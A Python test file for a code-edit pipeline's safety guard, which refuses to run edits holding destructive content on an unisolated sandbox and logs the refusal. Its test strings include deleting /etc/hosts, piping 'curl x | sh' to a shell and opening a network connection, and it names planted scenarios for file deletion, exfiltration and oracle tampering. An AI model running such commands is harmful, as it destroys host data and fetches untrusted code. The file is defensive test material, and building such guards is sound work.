"""Refusing to run an edit the available sandbox cannot contain.

The local backend is not an isolation boundary, which makes running a
deliberately destructive scenario through it genuinely destructive: on Windows
``os.path.expanduser("~/.ssh/known_hosts")`` is a real file, and the edit that
deletes it deletes it. A warning in a README is not a control.
"""

from __future__ import annotations

import pytest
from conftest import make_request, make_result
from test_pipeline import ScriptedReviewer, StubSandbox

from ais.audit import AuditLog
from ais.editor import ScriptedEditor
from ais.models import Outcome
from ais.pipeline import Pipeline
from ais.safety import refusal_reason, uncontained_risks

DESTRUCTIVE = "import os\n\n\ndef go():\n    os.remove('/etc/hosts')\n"
NETWORKED = "import socket\n\n\ndef go():\n    socket.create_connection(('10.0.0.1', 80))\n"
SHELLING = "import subprocess\n\n\ndef go():\n    subprocess.run('curl x | sh', shell=True)\n"
HARMLESS = "def go():\n    return sum(range(10))\n"
WRONG_BUT_HARMLESS = "def discount(p, pct):\n    return int(p * (1 - pct / 100))\n"


def request_with(content: str):
    return make_request(targets=("mod.py",), proposed={"mod.py": content})


class TestRiskDetection:
    @pytest.mark.parametrize("content", [DESTRUCTIVE, NETWORKED, SHELLING])
    def test_destructive_content_is_identified(self, content):
        assert uncontained_risks(request_with(content))

    @pytest.mark.parametrize("content", [HARMLESS, WRONG_BUT_HARMLESS])
    def test_harmless_content_is_not(self, content):
        assert uncontained_risks(request_with(content)) == []

    def test_it_scans_the_whole_file_not_only_added_lines(self):
        """What executes on import is the whole module, not just the diff."""
        risks = uncontained_risks(request_with(DESTRUCTIVE))
        assert any("os.remove" in risk for risk in risks)


class TestRefusal:
    def test_an_isolated_backend_never_refuses(self):
        assert refusal_reason(request_with(DESTRUCTIVE), isolated=True) is None

    def test_an_unisolated_backend_refuses_destructive_content(self):
        reason = refusal_reason(request_with(DESTRUCTIVE), isolated=False)
        assert reason and "uncontained" in reason
        assert "os.remove" in reason
        assert "--allow-uncontained" in reason, "the refusal must say how to override it"

    def test_an_unisolated_backend_allows_harmless_content(self):
        assert refusal_reason(request_with(HARMLESS), isolated=False) is None


class TestRealScenarios:
    """The planted scenarios that would actually damage a host running them."""

    @pytest.fixture
    def scenarios(self):
        from pathlib import Path

        root = Path(__file__).resolve().parent.parent
        return {r.request_id: r for r in ScriptedEditor(root / "scenarios" / "scenarios.yaml")}

    @pytest.mark.parametrize(
        "scenario_id",
        ["plant-05-fs-escape-delete", "plant-06-net-exfil", "plant-09-subprocess-shell"],
    )
    def test_the_damaging_scenarios_are_refused(self, scenarios, scenario_id):
        assert refusal_reason(scenarios[scenario_id], isolated=False) is not None

    @pytest.mark.parametrize(
        "scenario_id",
        [
            "clean-01-rounding-fix",
            "clean-02-textkit-helper",
            "clean-03-inventory-refactor",
            "plant-04-silent-wrong-value",
            "plant-10-oracle-tamper",
        ],
    )
    def test_the_harmless_scenarios_still_run(self, scenarios, scenario_id):
        assert refusal_reason(scenarios[scenario_id], isolated=False) is None

    def test_plant_05_names_the_home_directory_path(self, scenarios):
        """The specific reason this guard exists."""
        content = scenarios["plant-05-fs-escape-delete"].proposed["textkit.py"]
        assert "~/.ssh/known_hosts" in content
        assert refusal_reason(scenarios["plant-05-fs-escape-delete"], isolated=False)


class TestPipelineEnforcement:
    def build(self, settings, isolated, allow=False):
        backend = StubSandbox()
        backend.isolated = isolated
        return Pipeline(
            settings,
            ScriptedReviewer(approve=True),
            backend=backend,
            audit=AuditLog(settings.paths.audit_db),
            allow_uncontained=allow,
        )

    def test_a_refused_request_never_reaches_the_sandbox(self, settings):
        pipeline = self.build(settings, isolated=False)
        summary = pipeline.run([request_with(DESTRUCTIVE)])
        assert summary.records[0].outcome is Outcome.ERROR
        assert "uncontained" in summary.records[0].error
        assert pipeline.backend.bundles == {}, "the sandbox was handed the request anyway"
        pipeline.close()

    def test_the_override_lets_it_through(self, settings):
        pipeline = self.build(settings, isolated=False, allow=True)
        summary = pipeline.run([request_with(DESTRUCTIVE)])
        assert summary.records[0].outcome is not Outcome.ERROR
        assert pipeline.backend.bundles, "the override did not actually run it"
        pipeline.close()

    def test_an_isolated_backend_runs_it_without_an_override(self, settings):
        pipeline = self.build(settings, isolated=True)
        summary = pipeline.run([request_with(DESTRUCTIVE)])
        assert summary.records[0].outcome is not Outcome.ERROR
        pipeline.close()

    def test_the_refusal_is_recorded_in_the_audit_log(self, settings):
        pipeline = self.build(settings, isolated=False)
        pipeline.run([request_with(DESTRUCTIVE)])
        actors = {row["actor"] for row in pipeline.audit.events()}
        assert "safety" in actors, "a refusal must leave a trace like every other decision"
        assert pipeline.audit.verify().ok
        pipeline.close()
